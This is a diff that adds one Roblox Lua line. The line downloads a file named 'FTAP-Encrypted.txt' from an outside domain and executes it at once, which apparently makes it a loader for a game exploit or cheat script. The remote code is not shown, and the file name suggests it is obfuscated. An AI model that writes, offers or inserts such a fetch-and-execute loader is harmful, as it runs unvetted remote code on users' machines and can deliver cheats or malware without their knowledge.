@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://hahaxio7777.dpdns.org/resources?file=FTAP-Encrypted.txt"))()
